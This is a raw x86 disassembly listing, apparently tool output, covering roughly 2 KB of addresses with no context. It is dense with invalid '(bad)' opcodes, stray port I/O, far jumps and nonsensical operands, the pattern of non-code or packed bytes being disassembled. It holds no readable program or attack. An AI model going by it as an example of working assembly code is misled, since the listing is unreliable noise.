  41fc8b:	or     DWORD PTR [esi],esp
  41fc8d:	sbb    dl,BYTE PTR [edx+0x6d]
  41fc90:	ja     0x41fc73
  41fc92:	pop    es
  41fc93:	test   eax,0xfd795e5
  41fc98:	xor    ebp,DWORD PTR [ecx+0x74]
  41fc9b:	lds    esi,FWORD PTR [edi+0x3c]
  41fc9e:	in     al,0x50
  41fca0:	rol    DWORD PTR ds:0x74b061da,0x34
  41fca7:	std    
  41fca8:	pop    edx
  41fca9:	in     eax,0x39
  41fcab:	or     BYTE PTR [eax],dh
  41fcad:	mov    ds,esp
  41fcaf:	sbb    eax,0x7ff5de9b
  41fcb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcb5:	jno    0x41fce8
  41fcb7:	jg     0x41fd12
  41fcb9:	scas   eax,DWORD PTR es:[edi]
  41fcba:	ds pop ebp
  41fcbc:	neg    DWORD PTR [edx+0x722b377d]
  41fcc2:	push   ebx
  41fcc3:	popa   
  41fcc4:	jb     0x41fc73
  41fcc6:	xor    bl,BYTE PTR [esi-0x78d0ab4a]
  41fccc:	sbb    al,0xc2
  41fcce:	mov    ebp,0xdde2a392
  41fcd3:	push   ebx
  41fcd4:	imul   eax,DWORD PTR [ecx],0xffffff8e
  41fcd7:	gs jge 0x41fcfd
  41fcda:	fcom   DWORD PTR [edi+0x60777cc6]
  41fce0:	pop    ds
  41fce1:	jl     0x41fcf7
  41fce3:	mov    esp,0x6a8fc17e
  41fce8:	and    eax,0xc3856a34
  41fced:	daa    
  41fcee:	shl    ecx,0xcc
  41fcf1:	jecxz  0x41fd52
  41fcf3:	cmp    esp,ebp
  41fcf5:	shl    DWORD PTR [ebx+0x69b80ef2],0xfd
  41fcfc:	mov    eax,ds:0xa5a58ca5
  41fd01:	and    eax,0x2dbb8a29
  41fd06:	dec    esi
  41fd07:	cmc    
  41fd08:	fidivr DWORD PTR [edi+0x53]
  41fd0b:	xor    BYTE PTR [ebp-0x6ca1c876],ah
  41fd11:	outs   dx,DWORD PTR ds:[esi]
  41fd12:	loope  0x41fd16
  41fd14:	dec    DWORD PTR ds:[ebx]
  41fd17:	stos   BYTE PTR es:[edi],al
  41fd18:	push   edi
  41fd19:	jp     0x41fca9
  41fd1b:	push   ecx
  41fd1c:	dec    ebp
  41fd1d:	pop    ebp
  41fd1e:	jns    0x41fd71
  41fd20:	mov    ds:0x8902983d,al
  41fd25:	dec    esi
  41fd26:	pusha  
  41fd27:	adc    ebp,DWORD PTR [esi]
  41fd29:	call   0xcca5:0xbe52e910
  41fd30:	mov    esp,0x6fe0d4fd
  41fd35:	mov    bh,0xfa
  41fd37:	jge    0x41fd32
  41fd39:	add    al,0x6
  41fd3b:	test   DWORD PTR [ecx-0x15bff332],0x9db2cb1b
  41fd45:	(bad)  
  41fd46:	into   
  41fd47:	mov    bl,0xab
  41fd49:	cmp    ecx,ebx
  41fd4b:	mov    ds:0x29b670c2,al
  41fd50:	dec    eax
  41fd51:	sub    BYTE PTR ss:[eax],dl
  41fd54:	and    ecx,DWORD PTR [eax]
  41fd56:	aaa    
  41fd57:	out    dx,al
  41fd58:	and    al,0x66
  41fd5a:	iret   
  41fd5b:	or     ah,BYTE PTR [ecx+0x5b]
  41fd5e:	mov    edi,0x5bcd5072
  41fd63:	jge    0x41fd3a
  41fd65:	pop    ecx
  41fd66:	or     ecx,eax
  41fd68:	ret    0x91eb
  41fd6b:	cld    
  41fd6c:	sbb    eax,DWORD PTR [eax*4+0x27cc5a20]
  41fd73:	sbb    ecx,ebp
  41fd75:	not    BYTE PTR [ebx-0x6a]
  41fd78:	sbb    ebx,ecx
  41fd7a:	sub    al,0xd3
  41fd7c:	inc    esp
  41fd7d:	sahf   
  41fd7e:	std    
  41fd7f:	ja     0x41fd9a
  41fd81:	sub    eax,0xecf60846
  41fd86:	arpl   WORD PTR [ebp+0x25],ax
  41fd89:	iret   
  41fd8a:	adc    esp,DWORD PTR [esp+edi*4]
  41fd8d:	imul   ebx,DWORD PTR [ecx],0xfffffff3
  41fd90:	push   ebx
  41fd91:	loopne 0x41fda1
  41fd93:	sbb    al,0xfd
  41fd95:	cmovns esi,DWORD PTR [ebx]
  41fd98:	push   edx
  41fd99:	add    eax,0x3a83235a
  41fd9e:	and    al,0xb3
  41fda0:	ds fsub st,st(0)
  41fda3:	ins    DWORD PTR es:[edi],dx
  41fda4:	push   ds
  41fda5:	ret    0x8b36
  41fda8:	pusha  
  41fda9:	or     eax,0x27e1555b
  41fdae:	or     ebp,DWORD PTR [ebp+ecx*8+0x38]
  41fdb2:	jbe    0x41fd6a
  41fdb4:	jo     0x41fd69
  41fdb6:	ins    BYTE PTR es:[edi],dx
  41fdb7:	repnz sub edi,DWORD PTR [edx+0x6f]
  41fdbb:	loope  0x41fd74
  41fdbd:	aas    
  41fdbe:	mov    al,0xff
  41fdc0:	popf   
  41fdc1:	or     al,BYTE PTR [ebx]
  41fdc3:	jns    0x41fd71
  41fdc5:	ret    0xf70e
  41fdc8:	int    0xac
  41fdca:	mov    dh,0xea
  41fdcc:	mov    ds,WORD PTR [ebp-0x40]
  41fdcf:	ds mov bh,0xab
  41fdd2:	adc    BYTE PTR [eax],0x64
  41fdd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdd6:	ret    0xe884
  41fdd9:	mov    ebx,0x9e258d3
  41fdde:	stos   DWORD PTR es:[edi],eax
  41fddf:	add    BYTE PTR [ecx-0x30288330],dl
  41fde5:	test   eax,0x6922d6f4
  41fdea:	pop    ecx
  41fdeb:	mov    al,0x4d
  41fded:	dec    esp
  41fdee:	sbb    BYTE PTR [esi],cl
  41fdf0:	cmp    BYTE PTR [ebp+eiz*4+0x15d1fbec],dh
  41fdf7:	xchg   BYTE PTR [eax],bh
  41fdf9:	repz pop esi
  41fdfb:	inc    esp
  41fdfc:	sub    ebp,DWORD PTR [ebx]
  41fdfe:	(bad)  
  41fdff:	lock xchg ecx,eax
  41fe01:	adc    eax,0x7a21bbd6
  41fe06:	ror    bl,0x1f
  41fe09:	dec    edi
  41fe0a:	loop   0x41fdfa
  41fe0c:	rol    BYTE PTR [esi-0x193a082e],0xc
  41fe13:	dec    edx
  41fe14:	(bad)  
  41fe15:	cmp    eax,0x139cc0ae
  41fe1a:	popf   
  41fe1b:	mov    dl,0xe5
  41fe1d:	dec    ebx
  41fe1e:	and    al,0xdf
  41fe20:	jl     0x41fe32
  41fe22:	adc    BYTE PTR [edi+0x69],0x34
  41fe26:	jbe    0x41fdad
  41fe28:	lods   al,BYTE PTR ds:[esi]
  41fe29:	shl    DWORD PTR [edi-0x1],1
  41fe2c:	xor    DWORD PTR [eax],esi
  41fe2e:	aam    0x66
  41fe30:	cmp    al,BYTE PTR [edi-0x1f]
  41fe33:	push   cs
  41fe34:	cmc    
  41fe35:	adc    edx,DWORD PTR [ecx-0x68]
  41fe38:	shl    BYTE PTR [ecx+ecx*8+0x3c],0x9
  41fe3d:	cdq    
  41fe3e:	mov    eax,0x370c1305
  41fe44:	jg     0x41fe90
  41fe46:	mov    BYTE PTR [edx-0x485bd473],bl
  41fe4c:	sbb    dh,BYTE PTR [edx]
  41fe4e:	cmp    al,0x6c
  41fe50:	mov    edi,0x726e5d93
  41fe55:	shr    DWORD PTR [eax+0x18a26f6c],1
  41fe5b:	push   esi
  41fe5c:	and    esi,DWORD PTR [ecx-0x5c]
  41fe5f:	test   esi,esi
  41fe61:	cld    
  41fe62:	and    cl,BYTE PTR ds:0xfcef3389
  41fe68:	fs mov ah,0x93
  41fe6b:	gs out 0x77,al
  41fe6e:	test   al,0x35
  41fe70:	inc    ebp
  41fe71:	std    
  41fe72:	call   0xc9a2:0x84099a84
  41fe79:	outs   dx,BYTE PTR ds:[esi]
  41fe7a:	aad    0x74
  41fe7c:	and    BYTE PTR [eax+ebp*8],dh
  41fe7f:	pop    edx
  41fe80:	and    al,0x2c
  41fe82:	lea    edi,[ebp+0x3b]
  41fe85:	push   0x36
  41fe87:	xchg   edi,eax
  41fe88:	push   0x9eeedb0a
  41fe8d:	addr16 (bad) 
  41fe90:	mov    ebx,0x4cbd8815
  41fe95:	ins    DWORD PTR es:[edi],dx
  41fe96:	inc    edx
  41fe97:	or     ecx,DWORD PTR [edx+0x19d13707]
  41fe9d:	push   cs
  41fe9e:	push   ebx
  41fe9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fea0:	les    esp,FWORD PTR [ebp-0x7b3e8492]
  41fea6:	xchg   edi,eax
  41fea7:	pop    esp
  41fea8:	mov    ch,0x37
  41feaa:	jg     0x41fe46
  41feac:	push   ebx
  41fead:	dec    esi
  41feae:	push   0xfbd27a94
  41feb3:	xchg   BYTE PTR [ecx+eax*2],al
  41feb6:	push   edi
  41feb7:	cmc    
  41feb8:	mov    al,ds:0xd2e6c67e
  41febd:	lods   eax,DWORD PTR ds:[esi]
  41febe:	push   ebx
  41febf:	not    BYTE PTR [esi+ebp*4]
  41fec2:	aas    
  41fec3:	add    BYTE PTR [edx],0x27
  41fec6:	mov    ebx,0x8993d0c9
  41fecb:	mov    gs,ecx
  41fecd:	and    bh,BYTE PTR [edx-0x21095234]
  41fed3:	dec    edx
  41fed4:	mov    DWORD PTR [ebp+esi*4-0x7a],ebp
  41fed8:	sub    BYTE PTR [edx-0x4d],dh
  41fedb:	and    DWORD PTR [esi+0x3b277f8d],edi
  41fee1:	loope  0x41ff0a
  41fee3:	push   ebp
  41fee4:	jmp    0x5d7366e6
  41fee9:	cli    
  41feea:	es push ebx
  41feec:	pop    ebx
  41feed:	out    0x26,eax
  41feef:	les    edi,FWORD PTR [ecx+ebp*1-0x2d8ffa00]
  41fef6:	mov    BYTE PTR [esi+0x53],dl
  41fef9:	(bad)  
  41fefa:	loope  0x41ff21
  41fefc:	push   0xffffffe9
  41fefe:	rol    BYTE PTR ds:0x7ada325,cl
  41ff04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff05:	or     BYTE PTR [ebp-0x59],bh
  41ff08:	pop    ds
  41ff09:	aad    0xdb
  41ff0b:	or     eax,0x577e9308
  41ff10:	cmovb  esp,DWORD PTR [esi]
  41ff13:	out    0x84,al
  41ff15:	repnz stos BYTE PTR es:[edi],al
  41ff17:	dec    eax
  41ff18:	into   
  41ff19:	dec    edx
  41ff1a:	sbb    ebp,DWORD PTR [ebx+0x43d65b00]
  41ff20:	sbb    eax,0x749091f1
  41ff25:	mov    WORD PTR [edi+edx*1-0x3a5d2857],?
  41ff2c:	loop   0x41ffa8
  41ff2e:	mov    ch,0x8e
  41ff30:	repnz xchg ebx,eax
  41ff32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff33:	subps  xmm7,XMMWORD PTR [ebx+0x3c56eb41]
  41ff3a:	sub    al,0x11
  41ff3c:	push   edi
  41ff3d:	jb     0x41fef6
  41ff3f:	shr    ah,0x82
  41ff42:	test   BYTE PTR [eax+0x2a],bl
  41ff45:	pop    esp
  41ff46:	fbld   TBYTE PTR ds:0x15bd263d
  41ff4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff4d:	inc    ebp
  41ff4e:	sub    eax,0xa1e8e50
  41ff53:	jecxz  0x41ffab
  41ff55:	adc    DWORD PTR [ebx-0x64],edi
  41ff58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff59:	xor    eax,0x408650b1
  41ff5e:	add    al,0xfd
  41ff60:	xchg   esi,eax
  41ff61:	sbb    DWORD PTR [edi],esi
  41ff63:	xchg   DWORD PTR [ebp-0x21],ebp
  41ff66:	cs out 0x60,eax
  41ff69:	mov    al,0xb5
  41ff6b:	test   al,0xe3
  41ff6d:	call   0x952d:0x5cee127e
  41ff74:	inc    ebp
  41ff75:	bound  edx,QWORD PTR [edx-0x4f]
  41ff78:	mov    BYTE PTR [esi+0x63],dh
  41ff7b:	fcomp  QWORD PTR [ebp+ebp*1+0x9]
  41ff7f:	dec    ecx
  41ff80:	mov    eax,ds:0xcc54630b
  41ff85:	neg    dh
  41ff87:	neg    BYTE PTR [ecx]
  41ff89:	mov    ecx,0x3cf20713
  41ff8e:	pop    esp
  41ff8f:	push   ebp
  41ff90:	inc    esp
  41ff91:	sub    eax,0x7e6e465c
  41ff96:	xchg   ecx,eax
  41ff97:	jecxz  0x41ff41
  41ff99:	bound  edx,QWORD PTR ds:0x8ad1791
  41ff9f:	cmp    ch,al
  41ffa1:	and    DWORD PTR [ecx-0x9],ebx
  41ffa4:	inc    ecx
  41ffa5:	add    al,bh
  41ffa7:	mov    cl,0x43
  41ffa9:	(bad)  
  41ffaa:	ror    BYTE PTR [ebx],0x59
  41ffad:	and    BYTE PTR [eax],bh
  41ffaf:	rep ins BYTE PTR es:[edi],dx
  41ffb1:	aam    0xfa
  41ffb3:	and    DWORD PTR [ebx-0x59c7afb3],esi
  41ffb9:	mov    eax,ds:0x94d364fc
  41ffbe:	mov    bl,0x37
  41ffc0:	inc    ebp
  41ffc1:	push   0xb2f0956
  41ffc6:	xchg   DWORD PTR [eax],ecx
  41ffc8:	test   al,0x3e
  41ffca:	inc    edi
  41ffcb:	adc    DWORD PTR [ecx+0x34979df1],esp
  41ffd1:	pop    eax
  41ffd2:	mov    ecx,0xf9ed3bec
  41ffd7:	push   edi
  41ffd8:	loop   0x420041
  41ffda:	loopne 0x420031
  41ffdc:	enter  0x675e,0x39
  41ffe0:	loop   0x420056
  41ffe2:	push   0xffffffc4
  41ffe4:	(bad)  
  41ffe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffe6:	or     dl,BYTE PTR [edi-0x102fc7a]
  41ffec:	les    edx,FWORD PTR [edi]
  41ffee:	xchg   esp,eax
  41ffef:	push   ecx
  41fff0:	(bad)  
  41fff1:	sub    eax,DWORD PTR [edx-0x378985dc]
  41fff7:	addr16 ret 
  41fff9:	inc    ebx
  41fffa:	cli    
  41fffb:	add    eax,0x42a7837d
  420000:	and    bh,BYTE PTR ss:[esi+ebx*4]
  420004:	mov    eax,ds:0x1f70b82
  420009:	push   edx
  42000a:	mov    ebp,DWORD PTR [edi]
  42000c:	ja     0x41ffdf
  42000e:	sbb    BYTE PTR [esi-0x1acf6852],ah
  420014:	dec    esi
  420015:	jge    0x42000a
  420017:	aad    0xa3
  420019:	mov    edi,0xe2388878
  42001e:	adc    DWORD PTR [edi+0x21f4bf1a],ecx
  420024:	outs   dx,BYTE PTR ds:[esi]
  420025:	adc    al,0xf8
  420027:	in     al,dx
  420028:	cmp    DWORD PTR cs:[ebp+0x43b00de2],ebp
  42002f:	add    eax,0xf2b81f7b
  420034:	cwde   
  420035:	add    DWORD PTR ds:0x9c4789e4,0xd30b9f7c
  42003f:	push   eax
  420040:	fidivr DWORD PTR [ebp-0x54]
  420043:	add    edi,ecx
  420045:	xor    eax,0xc3391644
  42004a:	ins    DWORD PTR es:[edi],dx
  42004b:	loopne 0x41fffd
  42004d:	cmp    ecx,edi
  42004f:	and    esp,DWORD PTR fs:[ecx-0x68]
  420053:	lods   eax,DWORD PTR ds:[esi]
  420054:	aad    0x5e
  420056:	cli    
  420057:	xlat   BYTE PTR ds:[ebx]
  420058:	stos   DWORD PTR es:[edi],eax
  420059:	mov    dl,0x6a
  42005b:	daa    
  42005c:	int3   
  42005d:	lds    esp,FWORD PTR [eax+esi*1+0x1c]
  420061:	adc    BYTE PTR [eax-0x30d016a6],al
  420067:	mov    ?,WORD PTR [esi-0x51]
  42006a:	fwait
  42006b:	adc    dl,BYTE PTR [eax+0x55836f8a]
  420071:	ret    0xc5b1
  420074:	in     al,0xbf
  420076:	scas   al,BYTE PTR es:[edi]
  420077:	xlat   BYTE PTR ds:[ebx]
  420078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420079:	add    al,0xc7
  42007b:	xchg   ebx,eax
  42007c:	jle    0x420062
  42007e:	mov    ebp,ecx
  420080:	ja     0x4200a0
  420082:	shl    al,1
  420084:	popf   
  420085:	sbb    eax,0x747d7732
  42008a:	sbb    al,0xdb
  42008c:	repz cmp BYTE PTR [ebx],0xf3
  420090:	sub    esi,DWORD PTR [edi-0xc0aa850]
  420096:	popf   
  420097:	cmp    ah,ah
  420099:	xchg   bl,ah
  42009b:	or     esp,DWORD PTR [edi+ebp*8+0xbecf6dd]
  4200a2:	(bad)  [eax+eiz*4+0x5]
  4200a6:	fnsave [esi]
  4200a8:	push   ebp
  4200a9:	adc    al,0xf9
  4200ab:	mov    esp,0x24173ad7
  4200b0:	cmp    al,BYTE PTR [edx+0x4d]
  4200b3:	stc    
  4200b4:	jmp    0xc06d1da5
  4200b9:	add    al,bl
  4200bb:	shl    DWORD PTR [eax],1
  4200bd:	jo     0x42005c
  4200bf:	data16 (bad) 
  4200c1:	jb     0x420056
  4200c3:	mov    bl,0x88
  4200c5:	call   0xfc75c8e0
  4200ca:	daa    
  4200cb:	loopne 0x4200ff
  4200cd:	mov    ds:0x4a429013,al
  4200d2:	push   ss
  4200d3:	idiv   ebp
  4200d5:	cmp    DWORD PTR [edi+0x66],edx
  4200d8:	test   eax,0xa0204fc4
  4200dd:	mov    edx,0x6c9121ab
  4200e2:	jb     0x42010a
  4200e4:	sub    BYTE PTR ds:0xf5b222eb,dl
  4200ea:	sbb    BYTE PTR [edi],dl
  4200ec:	call   0x1782:0x3436a2a5
  4200f3:	or     ch,dl
  4200f5:	sar    DWORD PTR [ebx+0x5846eab5],cl
  4200fb:	xlat   BYTE PTR ds:[ebx]
  4200fc:	pop    edx
  4200fd:	lahf   
  4200fe:	mov    bl,0x9e
  420100:	mov    DWORD PTR [edx],ebx
  420102:	pop    edx
  420103:	pop    edx
  420104:	jge    0x42012a
  420106:	jno    0x42015c
  420108:	sti    
  420109:	and    ecx,esp
  42010b:	jb     0x42013a
  42010d:	mul    DWORD PTR [ebp+0x65e53762]
  420113:	ja     0x4200ee
  420115:	sub    DWORD PTR [ebp-0x6d004667],esp
  42011b:	imul   edi
  42011d:	mov    ebx,0x29e5df57
  420122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420123:	(bad)  
  420124:	cmp    al,0x89
  420126:	sar    edx,1
  420128:	and    eax,0x43de3e7d
  42012d:	pop    eax
  42012e:	jno    0x42016b
  420130:	in     al,0xdd
  420132:	test   al,0xde
  420134:	(bad)  
  420135:	mov    ch,0x45
  420137:	xchg   ecx,eax
  420138:	xor    BYTE PTR [esi],dh
  42013a:	jmp    0xb86e:0x2247473a
  420141:	cwde   
  420142:	dec    ecx
  420143:	mov    esi,0x4afae0cc
  420148:	pop    eax
  420149:	repnz mov edx,0xf63a15ce
  42014f:	adc    DWORD PTR [ecx-0x71],edi
  420152:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420153:	jp     0x4201a5
  420155:	mov    esp,0x6811593a
  42015a:	popa   
  42015b:	cmp    BYTE PTR [esi+0x74],bl
  42015e:	fstp   TBYTE PTR [ecx+0x1]
  420161:	out    0x9d,al
  420163:	add    eax,0xf98fde34
  420168:	adc    esp,DWORD PTR [edi+ebx*2+0xc2e9bd3]
  42016f:	mov    edi,0x13d1760c
  420174:	jns    0x4201a5
  420176:	(bad)  
  420177:	xor    eax,0xa20b35c3
  42017c:	push   eax
  42017d:	out    0x15,al
  42017f:	call   0xe026b1e
  420184:	adc    bl,dh
  420186:	iret   
  420187:	xchg   ecx,eax
  420188:	jo     0x42010a
  42018a:	inc    ecx
  42018b:	nop
  42018c:	dec    esi
  42018d:	clc    
  42018e:	jae    0x420179
  420190:	(bad)  
  420192:	push   esi
  420193:	(bad)  
  420194:	cwde   
  420195:	push   ebp
  420196:	pop    ebp
  420197:	arpl   WORD PTR [esi+0x5138dfb9],sp
  42019d:	mov    ecx,0x1976fe60
  4201a2:	jmp    0x32cc3a29
  4201a7:	test   al,0x7
  4201a9:	jl     0x4201c9
  4201ab:	xor    al,BYTE PTR [esi+0x2aed94f7]
  4201b1:	dec    eax
  4201b2:	stc    
  4201b3:	xor    BYTE PTR [ecx+ebx*1-0x7c0659fd],dh
  4201ba:	xor    DWORD PTR [ebx-0x6a],ebx
  4201bd:	cmp    eax,0x9777ff32
  4201c2:	pop    esp
  4201c3:	ret    
  4201c4:	int    0x56
  4201c6:	or     eax,0x1166920e
  4201cb:	push   ecx
  4201cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201cd:	fbstp  TBYTE PTR [ecx+0x69ad6179]
  4201d3:	add    esi,eax
  4201d5:	js     0x4201dd
  4201d7:	or     eax,0x64f7f99f
  4201dc:	sti    
  4201dd:	les    edi,FWORD PTR [ebx+0x16]
  4201e0:	adc    esp,DWORD PTR [ebx-0x14c665a1]
  4201e6:	sbb    esi,DWORD PTR [esi]
  4201e8:	or     edx,ebx
  4201ea:	ficomp DWORD PTR [esi+0x45ab17f8]
  4201f0:	dec    edi
  4201f1:	pop    esi
  4201f2:	dec    ebx
  4201f3:	leave  
  4201f4:	inc    edi
  4201f5:	mov    edi,DWORD PTR [edx-0x4b]
  4201f8:	add    al,BYTE PTR [ecx+0x4c]
  4201fb:	push   eax
  4201fc:	jae    0x420232
  4201fe:	pop    ds
  4201ff:	ins    BYTE PTR es:[edi],dx
  420200:	push   edx
  420201:	pop    DWORD PTR [edx-0x55996962]
  420207:	mov    ecx,0x6b963658
  42020c:	pop    edi
  42020d:	scas   al,BYTE PTR es:[edi]
  42020e:	jne    0x420207
  420210:	and    eax,0x5a5e2dc7
  420215:	xchg   esi,eax
  420216:	test   al,0x94
  420218:	jo     0x420288
  42021a:	aam    0xcb
  42021c:	(bad)  
  42021e:	adc    dh,dh
  420220:	and    DWORD PTR [eax],0xa
  420223:	xchg   esp,eax
  420224:	scas   eax,DWORD PTR es:[edi]
  420225:	or     BYTE PTR [ebp-0x6f],bl
  420228:	in     al,dx
  420229:	data16 cld 
  42022b:	xlat   BYTE PTR ds:[ebx]
  42022c:	aam    0x88
  42022e:	inc    edi
  42022f:	jl     0x420245
  420231:	and    DWORD PTR [ebx],edx
  420233:	cmp    DWORD PTR [esp+ebx*2+0x2b],0x35926c7e
  42023b:	add    edi,ecx
  42023d:	dec    esp
  42023e:	mov    ah,0x6e
  420240:	daa    
  420241:	lods   eax,DWORD PTR ds:[esi]
  420242:	aas    
  420243:	mov    al,0x4b
  420245:	fwait
  420246:	dec    esi
  420247:	xor    bh,BYTE PTR [edi-0x28]
  42024a:	push   ebx
  42024b:	aaa    
  42024c:	imul   ebx,DWORD PTR fs:[ecx+0x11],0xd87821cd
  420254:	(bad)  
  420256:	or     cl,bl
  420258:	gs jge 0x4201f1
  42025b:	mov    al,0x26
  42025d:	mov    ds:0x4ffb2016,al
  420262:	out    0xb5,al
  420264:	pop    eax
  420265:	repz xor al,0x35
  420268:	xchg   ebx,eax
  420269:	cmp    ecx,DWORD PTR [ecx]
  42026b:	xchg   DWORD PTR [ebx+0x5b],edx
  42026e:	push   ebp
  42026f:	jns    0x42024c
  420271:	mov    WORD PTR [esi],es
  420273:	(bad)  
  420274:	mov    ds:0x4a7eacc6,eax
  420279:	push   esp
  42027a:	es cld 
  42027c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42027d:	mov    esp,DWORD PTR ds:0x908cc4ff
  420283:	icebp  
  420284:	inc    ebx
  420285:	adc    eax,DWORD PTR [eax+0x38]
  420288:	daa    
  420289:	push   cs
  42028a:	popa   
  42028b:	cdq    
  42028c:	shr    DWORD PTR [eax+0x33],0xdf
  420290:	inc    edx
  420291:	pop    ebp
  420292:	mov    ebp,0xe4a803d0
  420297:	mov    ds:0x342c2988,al
  42029c:	adc    BYTE PTR [esi],bh
  42029e:	jge    0x4202b7
  4202a0:	xchg   esp,eax
  4202a1:	jno    0x420276
  4202a3:	fs adc bh,dh
  4202a6:	and    ebp,DWORD PTR [edi+0x2381102]
  4202ac:	aad    0xc7
  4202ae:	inc    ebx
  4202af:	xor    bh,BYTE PTR [eax]
  4202b1:	sahf   
  4202b2:	pop    ecx
  4202b3:	push   edi
  4202b4:	imul   esp,DWORD PTR [eax-0xbad99b9],0xffffffd1
  4202bb:	ret    
  4202bc:	nop
  4202bd:	inc    edx
  4202be:	mov    ch,0x12
  4202c0:	sbb    eax,0xb585ba32
  4202c5:	(bad)  
  4202c6:	stos   DWORD PTR es:[edi],eax
  4202c7:	pop    eax
  4202c8:	pop    esi
  4202c9:	mov    ds:0x530f4d52,al
  4202ce:	pop    edi
  4202cf:	ins    DWORD PTR es:[edi],dx
  4202d0:	mov    BYTE PTR [ecx+0x23f279ce],cl
  4202d6:	pusha  
  4202d7:	push   es
  4202d8:	jle    0x42034e
  4202da:	jmp    0x4202b8
  4202dc:	cmc    
  4202dd:	retf   
  4202de:	enter  0x6b81,0x99
  4202e2:	jns    0x420346
  4202e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202e5:	in     al,dx
  4202e6:	mov    DWORD PTR [ecx+0x23],ebp
  4202e9:	inc    ebx
  4202ea:	jns    0x4202f4
  4202ec:	push   edi
  4202ed:	frstor [ebp-0x7cfcd688]
  4202f3:	xchg   esi,eax
  4202f4:	lds    edi,FWORD PTR [ebx]
  4202f6:	loope  0x42033a
  4202f8:	dec    edx
  4202f9:	lahf   
  4202fa:	cmpps  xmm2,xmm3,0x6a
  4202fe:	adc    ebp,DWORD PTR [ebx]
  420300:	sub    dl,bl
  420302:	cld    
  420303:	in     al,0x1b
  420305:	sar    DWORD PTR [edx],1
  420307:	xchg   BYTE PTR [eax+edi*4+0x6f08585e],dl
  42030e:	sahf   
  42030f:	pushf  
  420310:	pop    ebx
  420311:	inc    edx
  420312:	push   ds
  420313:	sbb    al,0x24
  420315:	fs jbe 0x4202b0
  420318:	cmp    BYTE PTR [edx+eiz*1+0x72af7102],bh
  42031f:	out    dx,eax
  420320:	push   eax
  420321:	or     DWORD PTR [ecx+0x2827c878],eax
  420327:	sahf   
  420328:	in     al,dx
  420329:	mov    bl,0x54
  42032b:	aam    0xd8
  42032d:	aas    
  42032e:	js     0x420351
  420330:	clc    
  420331:	push   ecx
  420332:	xchg   ebp,eax
  420333:	out    dx,al
  420334:	push   edi
  420335:	sbb    dh,BYTE PTR [esi-0x31]
  420338:	cs jae 0x42037b
  42033b:	test   BYTE PTR [edx+0x70],dh
  42033e:	outs   dx,BYTE PTR ds:[esi]
  42033f:	mov    eax,0x501bfdea
  420344:	xchg   ebx,eax
  420345:	outs   dx,DWORD PTR ds:[esi]
  420346:	push   ebx
  420347:	dec    edi
  420348:	fwait
  420349:	xor    ch,bl
  42034b:	push   esp
  42034c:	and    cl,bh
  42034e:	(bad)  
  42034f:	cmc    
  420350:	in     eax,dx
  420351:	xor    BYTE PTR [eax+0x3d939702],0x4d
  420358:	stc    
  420359:	xchg   esp,eax
  42035a:	(bad)  
  42035c:	mov    al,ds:0xf21b803a
  420361:	or     DWORD PTR [ebx+0x60],eax
  420364:	mov    ah,al
  420366:	or     eax,0x4aeb1830
  42036b:	pop    ecx
  42036c:	leave  
  42036d:	inc    ebx
  42036e:	sbb    eax,0x8b949979
  420373:	pop    ecx
  420374:	cmp    al,0x70
  420376:	mov    edx,0x7853cb4b
  42037b:	ja     0x4203ef
  42037d:	inc    ebp
  42037e:	mov    ebp,0xf26d13f
  420383:	leave  
  420384:	lods   al,BYTE PTR ds:[esi]
  420385:	and    edx,0x8fa07653
  42038b:	xor    edx,edx
  42038d:	ret    0xc981
  420390:	mov    BYTE PTR [edi],0xcc
  420393:	mov    eax,0x87e83771
  420398:	es jge 0x4203c8
  42039b:	gs in  eax,0x2d
  42039e:	sub    ebp,DWORD PTR [ebx+0x64ec6245]
  4203a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203a5:	jmp    0x42037e
  4203a7:	xor    al,0x41
  4203aa:	inc    esi
  4203ab:	push   esp
  4203ac:	clc    
  4203ad:	ins    DWORD PTR es:[edi],dx
  4203ae:	cmc    
  4203af:	xor    BYTE PTR [ecx+0x4cebb3f5],bh
  4203b5:	dec    ebx
  4203b6:	dec    edi
  4203b7:	(bad)  
  4203b9:	pop    edi
  4203ba:	pop    eax
  4203bb:	(bad)  
  4203bc:	lods   al,BYTE PTR ds:[esi]
  4203bd:	mov    esp,DWORD PTR [ecx]
  4203bf:	mov    bh,BYTE PTR [ebx-0x66]
  4203c2:	cmp    cl,BYTE PTR [ecx-0xb]
  4203c5:	sti    
  4203c6:	sbb    al,0xbb
  4203c8:	mov    edi,0x87784c4a
  4203cd:	xchg   edi,eax
  4203ce:	outs   dx,DWORD PTR ds:[esi]
  4203cf:	fidiv  DWORD PTR [ecx-0x5c]
  4203d2:	xchg   ebx,eax
  4203d3:	lock dec di
  4203d6:	fidiv  DWORD PTR [ebx+esi*2-0x3f]
  4203da:	pop    esp
  4203db:	cmp    DWORD PTR [ebx],esi
  4203dd:	xchg   esp,eax
  4203de:	sbb    eax,0x23ef3370
  4203e3:	inc    ebp
  4203e4:	jl     0x4203ae
  4203e6:	push   ebx
  4203e7:	mov    ecx,0xc22cc38
  4203ec:	cld    
  4203ed:	inc    edi
  4203ee:	cmp    ch,BYTE PTR [ecx+0x5e1354ba]
  4203f4:	ja     0x4203cf
  4203f6:	out    0x91,al
  4203f8:	mov    bh,0x18
  4203fa:	mov    ebp,0x8f96bed2
  4203ff:	dec    edi
  420400:	jmp    0x9e5:0x65372433
  420407:	dec    esi
  420408:	js     0x420468
  42040a:	pop    edx
  42040b:	fs stos BYTE PTR es:[edi],al
  42040d:	and    al,0x81
  42040f:	lods   eax,DWORD PTR ds:[esi]
  420410:	stos   DWORD PTR es:[edi],eax
  420411:	rol    DWORD PTR [ebx+eax*8],1
  420414:	jne    0x4203e7
  420416:	pop    edi
